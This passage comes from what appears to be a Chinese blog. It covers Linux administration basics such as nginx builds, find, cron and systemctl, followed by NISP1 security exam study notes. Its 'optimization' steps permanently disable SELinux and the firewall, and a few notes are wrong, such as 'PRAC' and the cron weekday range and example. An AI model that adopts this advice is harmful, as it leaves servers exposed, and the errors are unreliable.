<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看文件类型</span></span><br><span class="line">file</span><br><span class="line">例子1：</span><br><span class="line">file 123.zip</span><br></pre></td></tr></table></figure>



<h2 id="11-文件传输"><a href="#11-文件传输" class="headerlink" title="11.文件传输"></a>11.文件传输</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">上传和下载</span></span><br><span class="line">rz  #上传</span><br><span class="line">sz  #下载</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">先安装lrzsz软件包</span></span><br><span class="line">yum  install lrzsz  -y</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">上传的例子</span></span><br><span class="line">如果使用xshell，直接鼠标拖拽，或者执行rz -E选择要上传的文件</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">下载的例子</span></span><br><span class="line">sz /root/test3.tar.gz</span><br></pre></td></tr></table></figure>

<p>xftp上传下载</p>
<p>scp传输</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">主要用于linux和linux服务器之间传输文件</span></span><br><span class="line">scp typora-setup-x64.exe  root@10.0.0.128:/tmp</span><br></pre></td></tr></table></figure>

<h2 id="12-软件的安装"><a href="#12-软件的安装" class="headerlink" title="12.软件的安装"></a>12.软件的安装</h2><p>编译安装</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1.下载源码包</span><br><span class="line">cd /opt/</span><br><span class="line">rm -fr *</span><br><span class="line">curl -o nginx.tar.gz http://nginx.org/download/nginx-1.20.1.tar.gz</span><br><span class="line"></span><br><span class="line">2.编译</span><br><span class="line">tar xf nginx.tar.gz </span><br><span class="line">cd nginx-1.20.1/</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">编译参数</span></span><br><span class="line">./configure --prefix=/usr/local/nginx --without-pcre --without-http_rewrite_module --without-http_gzip_module</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">编译</span></span><br><span class="line">make</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">安装</span></span><br><span class="line">make install</span><br><span class="line"></span><br><span class="line">3.运行</span><br><span class="line">/usr/local/nginx/sbin/nginx</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用浏览器访问http://&lt;虚拟机的ip地址&gt;</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">关闭防火墙</span></span><br><span class="line">systemctl stop firewalld</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">取消防火墙的开机自启</span></span><br><span class="line">systemctl disable firewalld</span><br></pre></td></tr></table></figure>

<p>rpm安装</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">redhat package manager包管理器</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">安装wget</span></span><br><span class="line">yum install wget -y</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用wget下载rpm包</span></span><br><span class="line">wget https://mirrors.tuna.tsinghua.edu.cn/centos/7/os/x86_64/Packages/tree-1.6.0-10.el7.x86_64.rpm</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">安装rpm包</span></span><br><span class="line">rpm -ivh tree-1.6.0-10.el7.x86_64.rpm </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">卸载</span></span><br><span class="line">rpm -e tree</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">升级</span></span><br><span class="line">rpm -Uvh  xxx.rpm</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看已安装的软件</span></span><br><span class="line">rpm -qa|grep httpd</span><br></pre></td></tr></table></figure>

<p>命令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">以树状的显示指定目录下的目录和文件的名称</span></span><br><span class="line">tree</span><br><span class="line">例子1：</span><br><span class="line">下载路径  yum install tree -y</span><br><span class="line">tree /usr/local</span><br></pre></td></tr></table></figure>

<p>yum安装</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">自动解决rpm依赖</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">yum安装扩展yum仓库</span></span><br><span class="line">yum install epel-release -y</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">yum安装nginx</span></span><br><span class="line">yum install nginx -y</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">yum移除nginx</span></span><br><span class="line">yum remove nginx -y</span><br><span class="line">yum list|grep ^bash 查找tab 安装包</span><br><span class="line">yum install bash-completion.noarch bash-completion-extras.noarch -y 所有tab</span><br></pre></td></tr></table></figure>

<p>安装方法总结</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">编译安装：优点： 自由定制  痛点：难度高，步骤繁琐</span><br><span class="line">rpm安装：优点：安装简单   痛点：需要自己解决依赖，不支持定制</span><br><span class="line">yum安装：优点：自动解决依赖，默认安装最新版  痛点：不支持定制</span><br></pre></td></tr></table></figure>

<h2 id="13-find文件查找"><a href="#13-find文件查找" class="headerlink" title="13.find文件查找"></a>13.find文件查找</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">文件查找</span></span><br><span class="line">例子1：普通查询</span><br><span class="line">find   /etc    -maxdepth 1  -type f  -name &quot;pa*&quot;</span><br><span class="line">命令   目录...   查找深度      类型      文件名称</span><br></pre></td></tr></table></figure>



<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">例子2：</span><br><span class="line">忽略大小写查询</span><br><span class="line">find /etc -maxdepth 1    -iname &quot;pa*&quot;</span><br></pre></td></tr></table></figure>



<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">例子3：</span><br><span class="line">根据修改时间查找文件</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">时间单位为天</span></span><br><span class="line">find /opt -type f -mtime -1   #-1代表一天以内，+1一天以前</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">时间单位为分钟</span></span><br><span class="line">[root@localhost ~]# find /root -type f -mmin -20</span><br><span class="line">/root/.bash_history</span><br><span class="line">/root/ReadMe.txt</span><br><span class="line">/root/.lesshst</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">atime：最后访问时间</span><br><span class="line">mtime：文件内容修改时间</span><br><span class="line">ctime：文件属性修改时间</span><br></pre></td></tr></table></figure>



<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">例子5：</span><br><span class="line">对找出的文件进行处理</span><br><span class="line">find /root -type f -mmin -30  ! -name &quot;.*&quot;  -exec rm &#123;&#125; \;</span><br><span class="line">find /root  -maxdepth 1  -type d  -name &quot;Apa*&quot;   -mmin -30 -exec cp -a &#123;&#125; /tmp \;</span><br></pre></td></tr></table></figure>

<h2 id="14-进程管理"><a href="#14-进程管理" class="headerlink" title="14.进程管理"></a>14.进程管理</h2><p>进程：正在运行的程序</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看进程</span></span><br><span class="line">ps</span><br><span class="line">参数1：ps -ef</span><br></pre></td></tr></table></figure>



<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">关闭进程</span></span><br><span class="line">kill</span><br><span class="line">例子1： kill  7851  #使用进程id号，来终止进程</span><br><span class="line">pkill </span><br><span class="line">例子1： pkill sleep  #使用进程的命令名称，来终止进程</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#查看计算机的cpu，内存，进程等信息</span><br><span class="line">top</span><br></pre></td></tr></table></figure>

<h2 id="15-定时任务"><a href="#15-定时任务" class="headerlink" title="15.定时任务"></a>15.定时任务</h2><p>定期执行任务</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">时间命令</span></span><br><span class="line">date</span><br><span class="line">例子1：</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看时间</span></span><br><span class="line">[root@localhost ~]# date</span><br><span class="line">2021年 07月 23日 星期五 14:38:19 CST</span><br><span class="line">[root@localhost ~]# date +%F</span><br><span class="line">2021-07-23</span><br><span class="line">[root@localhost ~]# date +%T</span><br><span class="line">14:35:47</span><br><span class="line"></span><br><span class="line">例子2：</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">修改时间</span></span><br><span class="line">[root@localhost ~]# date -s &#x27;20200723 14:40:00&#x27;</span><br><span class="line">2020年 07月 23日 星期四 14:40:00 CST</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">定时任务的格式</span></span><br><span class="line">*  *  * *  *    cmd</span><br><span class="line">分 时 日 月 周    命令</span><br><span class="line">分：0-59</span><br><span class="line">时：0-23</span><br><span class="line">日：0-31</span><br><span class="line">月：1-12</span><br><span class="line">周：1-7</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">每5分钟执行一次</span></span><br><span class="line">*/5  *  * *  *</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">每1小时执行一次</span></span><br><span class="line">01 */1 * * *</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">每半个小时执行一次</span></span><br><span class="line">00,30  */1 * * *</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">每天晚上8:00执行一次</span></span><br><span class="line">00 20 */1 * *</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">每周1晚上8:00执行一次</span></span><br><span class="line">00 20 */1 * 1,3,5</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看定时任务，遇到特殊符号%,需要添加转义符号\;</span></span><br><span class="line">[root@localhost ~]# crontab -l</span><br><span class="line">* * * * *  echo `date +\%T` &gt;&gt;/tmp/time.txt</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">编辑定时任务</span></span><br><span class="line">[root@localhost ~]# crontab -e</span><br><span class="line"></span><br><span class="line">如果定时任务的格式，或者内容有问题，系统都会发邮件提示</span><br></pre></td></tr></table></figure>



<h2 id="16-服务管理"><a href="#16-服务管理" class="headerlink" title="16.服务管理"></a>16.服务管理</h2><p>优化系统：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1.优化ssh</span><br><span class="line">vi /etc/ssh/sshd_config</span><br><span class="line">79行：GSSAPIAuthentication no</span><br><span class="line">115行：UseDNS no</span><br><span class="line">systemctl restart sshd</span><br><span class="line"></span><br><span class="line">2.优化selinux</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">修改配置文件，永久关闭</span></span><br><span class="line">vi /etc/selinux/config</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">第7行修改为</span></span><br><span class="line">SELINUX=disabled</span><br><span class="line">需要重启生效</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">立即生效，临时的</span></span><br><span class="line">setenforce 0</span><br></pre></td></tr></table></figure>



<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">3.关闭firewalld</span><br><span class="line">systemctl stop firewalld</span><br><span class="line">systemctl disable firewalld</span><br><span class="line"></span><br><span class="line">4.优化yum源</span><br><span class="line">curl -o /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo</span><br><span class="line"></span><br><span class="line">5.安装常用软件</span><br><span class="line">yum install lrzsz vim tree wget net-tools screen tcpdump bash-completion -y</span><br></pre></td></tr></table></figure>

<p>安装httpd</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum install httpd -y</span><br></pre></td></tr></table></figure>

<p>服务管理</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">启动服务</span><br><span class="line">systemctl  start  httpd  #start启动</span><br><span class="line">停止服务</span><br><span class="line">systemctl  stop   httpd  #stop停止</span><br><span class="line">重启服务</span><br><span class="line">systemctl  restart   httpd #restart重启</span><br><span class="line">查看服务状态</span><br><span class="line">systemctl  status   httpd  #查看服务状态</span><br><span class="line">把服务设置为开机启动</span><br><span class="line">systemctl enable httpd.service</span><br><span class="line">取消服务的开机自启</span><br><span class="line">systemctl disable httpd.service</span><br></pre></td></tr></table></figure>

<p>软件和服务都是程序</p>
<p>软件一般是客户端curl</p>
<p>服务一般是给客户端提供某一个功能，7*24一直运行</p>
<h2 id="17-审计信息"><a href="#17-审计信息" class="headerlink" title="17.审计信息"></a>17.审计信息</h2><blockquote>
<p>系统启动日志(boot.log)</p>
<p>记录用户执行命令日志(acct&#x2F;pacct)</p>
<p>记录使用su命令的使用(sulog)</p>
<p>记录但钱登录的用户信息(utmp)</p>
<p>用户每次登录和退出信息(wtmp)</p>
<p>最近几次成功登录及最后一次不成功登录日志(lastlog)</p>
<p>不良的登录尝试记录(loginlog)</p>
<p>记录输出到系统主控台以及由 syslog系统服务程序产生的消息(messages)</p>
<p>记录使用外部介质出现的错误(vold.log)</p>
<p>记录每个用户使用过的命令(acct)</p>
</blockquote>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>NISP1</title>
    <url>/2024/05/03/NISP1/</url>
    <content><![CDATA[<meta name="referrer" content="no-referrer">



<h3 id="访问控制模型"><a href="#访问控制模型" class="headerlink" title="访问控制模型"></a>访问控制模型</h3><p><img src="https://gitee.com/kingwempity/images/raw/master/images/image-20240503165404974.png" alt="image-20240503165404974"></p>
<p><img src="https://gitee.com/kingwempity/images/raw/master/images/%E8%87%AA%E4%B8%BB%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E7%AD%96%E7%95%A5.png" alt="自主访问控制"></p>
<p><img src="https://gitee.com/kingwempity/images/raw/master/images/Biba%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E6%A8%A1%E5%9E%8B.png" alt="Biba访问控制模型"></p>
<blockquote>
<p>PRAC是基于角色的访问控制模型</p>
<p>BLP模型、Biba模型、Clark-Wilson模型、Chinese Wall模型是基于强制访问控制模型</p>
</blockquote>
<blockquote>
<p>“针对每个用户指明能够访问的资源”属于自主访问控制。</p>
</blockquote>
<blockquote>
<p>Biba模型解决了系统内数据的完整性问题</p>
<p>BLP模型解决 了系统内数据的保密性问题</p>
</blockquote>
<h3 id="网络设备——集线器、路由器"><a href="#网络设备——集线器、路由器" class="headerlink" title="网络设备——集线器、路由器"></a>网络设备——集线器、路由器</h3><p><img src="https://gitee.com/kingwempity/images/raw/master/images/nisp2.png" alt="image-20240503170104551"></p>
<p><img src="https://gitee.com/kingwempity/images/raw/master/images/nisp1" alt="image-20240503170311884"></p>
<p><img src="https://gitee.com/kingwempity/images/raw/master/images/%E8%B7%AF%E7%94%B1%E5%99%A8%E5%92%8C%E7%BD%91%E5%8D%A1.png" alt="路由器和网卡"></p>
<blockquote>
<p>交换机和可以接入交换机的任意两个网络结点提供独享的电信号通路</p>
</blockquote>
<h3 id="身份鉴别方式——实体所知、所有、特征"><a href="#身份鉴别方式——实体所知、所有、特征" class="headerlink" title="身份鉴别方式——实体所知、所有、特征"></a>身份鉴别方式——实体所知、所有、特征</h3><p><img src="https://gitee.com/kingwempity/images/raw/master/images/nisp3" alt="image-20240503170614449"></p>
<p><img src="https://gitee.com/kingwempity/images/raw/master/images/%E8%BA%AB%E4%BB%BD%E9%89%B4%E5%88%AB.png" alt="身份鉴别"></p>
<p><img src="https://gitee.com/kingwempity/images/raw/master/images/%E5%AF%86%E7%A0%81%E3%80%81%E5%8F%A3%E4%BB%A4%E5%B1%9E%E4%BA%8E%E5%AE%9E%E4%BD%93%E6%89%80%E7%9F%A5.png" alt="密码、口令属于实体所知"></p>
<blockquote>
<p>用户名&#x2F;密码、登入账号（实体所知），手机短信验证码（实体所有）、刷脸识别（实体特征）</p>
</blockquote>
<h3 id="密码加密算法"><a href="#密码加密算法" class="headerlink" title="密码加密算法"></a>密码加密算法</h3><p><img src="https://gitee.com/kingwempity/images/raw/master/images/nisp4" alt="哈希算法"></p>
<p><img src="https://gitee.com/kingwempity/images/raw/master/images/%E5%AF%B9%E7%A7%B0%E5%AF%86%E7%A0%81%E7%AE%97%E6%B3%95.png" alt="对称密码算法"></p>
<blockquote>
<p>哈希算法：MD5 、SHA-1、SHA-256</p>
<p>对称加密：RC5、DES、AES</p>
<p>非对称密码算法：RSA，Rabin，ECC</p>
</blockquote>
<h3 id="密码学的发展阶段——香农论文（近代密码学）"><a href="#密码学的发展阶段——香农论文（近代密码学）" class="headerlink" title="密码学的发展阶段——香农论文（近代密码学）"></a>密码学的发展阶段——香农论文（近代密码学）</h3><p><img src="https://gitee.com/kingwempity/images/raw/master/images/%E8%BF%9B%E5%85%A5%E8%BF%91%E4%BB%A3%E5%AF%86%E7%A0%81%E9%98%B6%E6%AE%B5%E7%9A%84%E6%A0%87%E5%BF%97.png" alt="进入近代密码阶段的标志"></p>
<blockquote>
<p>1949年香农发表的划时代论文””保密系统的通信理论”为近代密码学的标志</p>
</blockquote>
<h3 id="密码学的发展阶段——密码机（古典密码学）"><a href="#密码学的发展阶段——密码机（古典密码学）" class="headerlink" title="密码学的发展阶段——密码机（古典密码学）"></a>密码学的发展阶段——密码机（古典密码学）</h3><p><img src="https://gitee.com/kingwempity/images/raw/master/images/nisp5.png" alt="nisp5"></p>
<blockquote>
<p>Enigma密码机属于古典密码学</p>
</blockquote>
<h3 id="防火墙的作用"><a href="#防火墙的作用" class="headerlink" title="防火墙的作用"></a>防火墙的作用</h3><p><img src="https://gitee.com/kingwempity/images/raw/master/images/%E9%98%B2%E7%81%AB%E5%A2%99%E7%9A%84%E4%BD%9C%E7%94%A8.png" alt="防火墙的作用"></p>
<blockquote>
<p>防火墙保障的是内部网络数据的安全</p>
<p>防火墙隔离两个不同安全要求的网络</p>
<p>防火墙根据定义控制策略，检查并控制两个安全域之间的流量</p>
<p>防火墙对进出网络边界的数据进行保护，防止恶意入侵，恶意代码的传播</p>
</blockquote>
<h3 id="入侵检测机制"><a href="#入侵检测机制" class="headerlink" title="入侵检测机制"></a>入侵检测机制</h3><p><img src="https://gitee.com/kingwempity/images/raw/master/images/%E4%B8%BB%E6%9C%BA%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E7%B3%BB%E7%BB%9F.png" alt="主机入侵检测系统"></p>
<blockquote>
<p>主机入侵检测系统能供用于加密网络环境，可移植性差，开发、测试的压力比较大，能够监视所有系统</p>
</blockquote>
<h3 id="密码编码学和密码分析学"><a href="#密码编码学和密码分析学" class="headerlink" title="密码编码学和密码分析学"></a>密码编码学和密码分析学</h3><p><img src="https://gitee.com/kingwempity/images/raw/master/images/%E5%AF%86%E7%A0%81%E7%BC%96%E7%A0%81%E5%AD%A6%E5%92%8C%E5%AF%86%E7%A0%81%E5%88%86%E6%9E%90%E5%AD%A6.png" alt="密码编码学和密码分析学"></p>
<blockquote>
<p>密码编码学：主要研究信息的编码，构建各种安全有效的密码算法和协议，用于信息的加密、认证等方面。</p>
<p>密码分析学：主要研究破译密码获得消息，或对消息进行伪造。</p>
</blockquote>
<h3 id="涉密载体"><a href="#涉密载体" class="headerlink" title="涉密载体"></a>涉密载体</h3><p><img src="https://gitee.com/kingwempity/images/raw/master/images/%E6%B6%89%E5%AF%86%E8%BD%BD%E4%BD%93.png" alt="涉密载体"></p>
<blockquote>
<p>涉密计算机禁止和外网连接</p>
</blockquote>
<h3 id="状态检测机制的缺点"><a href="#状态检测机制的缺点" class="headerlink" title="状态检测机制的缺点"></a>状态检测机制的缺点</h3><p><img src="https://gitee.com/kingwempity/images/raw/master/images/%E7%8A%B6%E6%80%81%E6%A3%80%E6%B5%8B%E6%9C%BA%E5%88%B6.png" alt="状态检测机制"></p>
<blockquote>
<p>状态检测机制的缺点：检查内容比包过滤检测技术多，对防火墙的性能提出了更高要求；状态检测防火墙的配置非常复杂，对于用户的能力要求较高，使用起来不太方便。</p>
</blockquote>
<h3 id="信息安全目标"><a href="#信息安全目标" class="headerlink" title="信息安全目标"></a>信息安全目标</h3><p><img src="https://gitee.com/kingwempity/images/raw/master/images/%E5%AF%86%E7%A0%81%E5%AD%A6%E4%BF%9D%E5%AF%86%E6%80%A7.png" alt="密码学保密性"></p>
<blockquote>
<p>保密性事确保信息被合法用户访问，而不呗泄露给非授权的用户、实体或过程，或供其利用的特性。</p>
</blockquote>
<h3 id="传输服务的默认端口"><a href="#传输服务的默认端口" class="headerlink" title="传输服务的默认端口"></a>传输服务的默认端口</h3><p><img src="https://gitee.com/kingwempity/images/raw/master/images/ftp%E7%AB%AF%E5%8F%A321.png" alt="ftp端口21"></p>
<p><img src="https://gitee.com/kingwempity/images/raw/master/images/POP3%E9%BB%98%E8%AE%A4%E7%AB%AF%E5%8F%A3.png" alt="POP3默认端口"></p>
<p><img src="https://gitee.com/kingwempity/images/raw/master/images/DNS%E9%BB%98%E8%AE%A4%E7%AB%AF%E5%8F%A353.png" alt="DNS默认端口53"></p>
<p><img src="https://gitee.com/kingwempity/images/raw/master/images/SMTP%E9%BB%98%E8%AE%A4%E7%AB%AF%E5%8F%A325.png" alt="SMTP默认端口25"></p>
<blockquote>
<p>FTP默认端口21</p>
<p>SFTP默认端口22(SSH文件传输协议)</p>
<p>POP3默认端口110</p>
<p>DNS默认端口53</p>
<p>SMTP默认端口25</p>
<p>共享文件夹默认端口445</p>
<p>远程桌面端口3389</p>
<p>Telnet端口23</p>
<p>HTTPS默认端口443</p>
</blockquote>
<h3 id="计算机网络的节点——转换节点和访问节点"><a href="#计算机网络的节点——转换节点和访问节点" class="headerlink" title="计算机网络的节点——转换节点和访问节点"></a>计算机网络的节点——转换节点和访问节点</h3><p><img src="https://gitee.com/kingwempity/images/raw/master/images/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%9A%84%E8%8A%82%E7%82%B9.png" alt="计算机网络的节点"></p>
<blockquote>
<p>计算机网络的节点包括：转换节点和访问节点</p>
</blockquote>
<h3 id="物联网体系结构"><a href="#物联网体系结构" class="headerlink" title="物联网体系结构"></a>物联网体系结构</h3><p><img src="https://gitee.com/kingwempity/images/raw/master/images/%E7%89%A9%E8%81%94%E7%BD%91%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84%E4%BD%9C%E7%94%A8.png" alt="物联网体系结构作用"></p>
<blockquote>
<p>物联网体系结构的作用：</p>
<ul>
<li>感知层：全面感知外界信息，本层主要设备是各种信息收集器</li>
<li>传输层：主要用于把感知层收集的信息安全可靠地传输到信息支撑层，然后根据不同的应用需求进行信息处理。</li>
<li>支撑层：对节点采集的信息处理，对信息进行分析和过滤，需要判断接受的信息是否真实有用，过滤掉垃圾升值恶意信息。</li>
<li>应用层：具体的应用业务，所涉及的安全问题与业务特性相关，例如隐私保护、知识产权保护、取证、数据销毁等方面。</li>
</ul>
</blockquote>
<h3 id="网络信息安全基本属性"><a href="#网络信息安全基本属性" class="headerlink" title="网络信息安全基本属性"></a>网络信息安全基本属性</h3><p><img src="https://gitee.com/kingwempity/images/raw/master/images/%E6%95%B0%E6%8D%AE%E5%AE%8C%E6%95%B4%E6%80%A7.png" alt="数据完整性"></p>
<blockquote>
<ul>
<li>完整性：保证信息系统中的数据处于完整的状态，确保信息没有遭受篡改和破坏。</li>
<li>机密性：网络信息不泄露给非授权用户、实体或程序，能够防止非授权者获取信息。</li>
<li>可用性：合法许可的用户能后及时获取网络信息或服务的特性。</li>
<li>抗抵抗性：防止网络信息系统相关用户否认活动行为的特性。</li>
<li>可控性：网络信息系统责任主体对其具有管理、支配能力的属性。</li>
</ul>
</blockquote>
<h3 id="大数据的生命周期"><a href="#大数据的生命周期" class="headerlink" title="大数据的生命周期"></a>大数据的生命周期</h3><p><img src="https://gitee.com/kingwempity/images/raw/master/images/%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%9A%84%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F.png" alt="大数据的生命周期"></p>
<blockquote>
<p>大数据的生命周期：数据采集、数据存储、数据处理、数据分发、数据删除</p>
</blockquote>
<h3 id="七个任务、四项措施"><a href="#七个任务、四项措施" class="headerlink" title="七个任务、四项措施"></a>七个任务、四项措施</h3><p><img src="https://gitee.com/kingwempity/images/raw/master/images/%E5%8A%A0%E5%BC%BA%E5%B7%A5%E4%B8%9A%E4%BA%92%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8%E5%B7%A5%E8%B5%84%E7%9A%84%E6%8C%87%E5%AF%BC%E6%84%8F%E8%A7%81.png" alt="加强工业互联网安全工资的指导意见"></p>
<blockquote>
<p>《意见》提出达成七个主要任务和四项保障措施</p>
</blockquote>
<h3 id="网络钓鱼攻击手段"><a href="#网络钓鱼攻击手段" class="headerlink" title="网络钓鱼攻击手段"></a>网络钓鱼攻击手段</h3><p><img src="https://gitee.com/kingwempity/images/raw/master/images/%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E6%94%BB%E5%87%BB.png" alt="网络钓鱼攻击"></p>
<blockquote>
<ul>
<li>网络钓鱼攻击手段：邮件地址欺骗、伪造网站页面、社会工程学</li>
<li>主动防御技术：蜜罐技术。</li>
</ul>
</blockquote>
<h3 id="可实现保密性的传输协议——SSL协议"><a href="#可实现保密性的传输协议——SSL协议" class="headerlink" title="可实现保密性的传输协议——SSL协议"></a>可实现保密性的传输协议——SSL协议</h3><p><img src="https://gitee.com/kingwempity/images/raw/master/images/%E5%8D%8F%E8%AE%AE%E7%9A%84%E4%BF%9D%E5%AF%86%E6%80%A7.png" alt="协议的保密性"></p>
<blockquote>
<p>SSL协议中，使用握手协商加密和MAC算法以及保密密钥使用握手协议交换的数据进行加密和签名，使用报警协议定义数据传输过程中，出现问题如何去解决。<br>FTP协议、POP3协议、HTTP协议无法保证保密性。、</p>
</blockquote>
<h3 id="状态检测防火墙功能"><a href="#状态检测防火墙功能" class="headerlink" title="状态检测防火墙功能"></a>状态检测防火墙功能</h3><p><img src="https://gitee.com/kingwempity/images/raw/master/images/%E7%8A%B6%E6%80%81%E6%A3%80%E6%B5%8B%E9%98%B2%E7%81%AB%E5%A2%99.png" alt="状态检测防火墙"></p>
<blockquote>
<p>状态检测防火墙又称动态包过滤防火墙，是对传统包过滤的功能拓展。</p>
<p>状态检测防火墙实质上是包过滤，但它不仅对IP包头信息进行检查过滤，而且还要检查包的TCP头部信息甚至包的内容。</p>
<p>状态检查防火墙允许规则的动态变化。</p>
<p>状态防火墙通过采用状态监视器，对网络通信的各层（包括网络层、传输层以及应用层）实施检测，抽取其中部分数据，形成网络连接的动态状态信息。</p>
</blockquote>
<p><img src="https://gitee.com/kingwempity/images/raw/master/images/%E7%8A%B6%E6%80%81%E6%A3%80%E6%B5%8B%E9%98%B2%E7%81%AB%E5%A2%99%E7%9A%84%E4%BC%98%E7%82%B9.png" alt="状态检测防火墙的优点"></p>
<h3 id="上网行为管理"><a href="#上网行为管理" class="headerlink" title="上网行为管理"></a>上网行为管理</h3><p><img src="https://gitee.com/kingwempity/images/raw/master/images/%E4%B8%8A%E7%BD%91%E8%A1%8C%E4%B8%BA%E7%AE%A1%E7%90%86.png" alt="上网行为管理"></p>
<blockquote>
<p>上网行为管理目前可实现的功能：上网身份管控、互联网浏览管控、邮件外发管控、用户行为管控、上网应用管控。</p>
</blockquote>
<h3 id="IPV6-的地址空间——128位"><a href="#IPV6-的地址空间——128位" class="headerlink" title="IPV6 的地址空间——128位"></a>IPV6 的地址空间——128位</h3><p><img src="https://gitee.com/kingwempity/images/raw/master/images/IPV6%E5%9C%B0%E5%9D%80%E7%A9%BA%E9%97%B4.png" alt="IPV6地址空间"></p>
<blockquote>
<p>IPV6是128位的地址空间，IPV4是32位地址空间</p>
</blockquote>
<h3 id="IPS-入侵防御系统-主要功能"><a href="#IPS-入侵防御系统-主要功能" class="headerlink" title="IPS(入侵防御系统)主要功能"></a>IPS(入侵防御系统)主要功能</h3><p><img src="https://gitee.com/kingwempity/images/raw/master/images/%E5%85%A5%E4%BE%B5%E9%98%B2%E5%BE%A1%E7%B3%BB%E7%BB%9FIPS.png" alt="入侵防御系统IPS"></p>
<blockquote>
<p>IPS(入侵防御系统)主要功能：实时监视和拦截攻击；保护客户端；虚拟补丁。</p>
</blockquote>
<h3 id="VLAN之间数据传递的设备——路由器"><a href="#VLAN之间数据传递的设备——路由器" class="headerlink" title="VLAN之间数据传递的设备——路由器"></a>VLAN之间数据传递的设备——路由器</h3><p><img src="https://gitee.com/kingwempity/images/raw/master/images/VLAN%E6%95%B0%E6%8D%AE%E4%BC%A0%E9%80%92%E8%AE%BE%E5%A4%87.png" alt="VLAN数据传递设备"></p>
<blockquote>
<p>能完成不同VLAN之间的数据传递的设备是路由器。路由器适用于不同网络之间。</p>
</blockquote>
